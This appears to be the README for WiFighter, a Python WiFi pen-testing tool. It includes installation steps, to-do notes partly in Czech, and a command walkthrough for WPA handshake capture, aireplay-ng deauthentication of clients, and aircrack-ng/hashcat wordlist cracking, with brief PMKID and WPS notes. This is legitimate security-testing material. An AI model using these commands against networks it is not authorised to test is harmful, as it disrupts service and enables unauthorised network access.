# WiFighter
Easy-to-use WiFI pen-testing/scanning tool written in python


## Installation 

**Dependencies**
```c
sudo zypper in python3 aircrack-ng hashcat ...
```

**Creating python virtual enviroment**

Clone the project
```c
git clone https://github.com/FilipStruhar/WiFighter.git
```

Enter the project folder
```c
cd WiFighter
```

Create virtual enviroment
```c
python3 -m venv venv
```

Enter the virtual enviroment
```c
source venv/bin/activate
```

Install python modules (prettytable, tqdm) 
```c
pip3 install -r requirements.txt
```

Exit from virtual enviroment
```c
deactivate
```

Run the tool
```c
sudo ./wifighter.py
```


## WiFi Scan & Select

1. Fix device busy (missing: if error erase tqdm progress bar)
2. Client scanning
3. Encryption type
4. Make sure interface in managed with NetworkManager on before scanning

## Threat Hunt




## Attack mode

### 1. WPA/WPA2 Handshake Crack

**Aircrack guide**
- WPA, WEP Cracking
- WiFi Scanning
- AP Deauth (DoS)

**Monitor mode**

Set interface to monitor
```c
sudo airmon-ng start <INTERFACE>
```

Set interface to managed
```c
sudo airmon-ng stop <INTERFACE>mon
```

**Scan nearby WiFi's**

Scan all
```c
sudo airodump-ng <INTERFACE>mon
```

Scan 2.4GHz WiFi's
```c
sudo airodump-ng --band gb <ESSID> <INTERFACE>mon
```

Scan 5GHz WiFi's
```c
sudo airodump-ng --band a <ESSID> <INTERFACE>mon
```

**Capture handshake**

Listen for handshake of specified AP
```c
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_FILE> <INTERFACE>mon
```

**Deauth clients (force handshake)**

Deauth all (broadcast)
```c
sudo aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
```

Deauth client
```c
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
```

Verify captured handshake
```c
sudo aircrack-ng <HANDSHAKE>.cap 
```

**Crack handshake - aircrack**

```c
sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
```

**Crack handshake - hashcat**

Convert captured handshake to hashcat format
```c
sudo aircrack-ng -J <OUTPUTFILE> <HANDSHAKE>.cap  
```

Crack with wordlist
```c
sudo hashcat -m 22000 <HANDSHAKE>.hccap <WORDLIST>
```


### 2. PMKID Attack (802.11r exploit)

**Hcxtools guide - TESTOVAT U TATY, TP-Link OneMesh feature**

- PMKID Capture
- Converting raw .pcapng captures to hashcat readable formats

**Installation**

```c
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
```



### 3. WPS

**Reaver or Bully ??**
- Online WPS PIN Brute Force

**Pixie Dust**
- Offline WPS PIN crack
- Není to brute force (rychlejší)
- Využívá slabé kryptografie PINu (né každý router je náchylný)




